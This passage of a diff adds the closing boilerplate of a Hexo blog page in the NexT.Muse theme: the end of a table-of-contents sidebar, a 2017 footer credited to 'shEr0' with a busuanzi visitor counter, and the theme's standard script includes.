href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shEr0</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
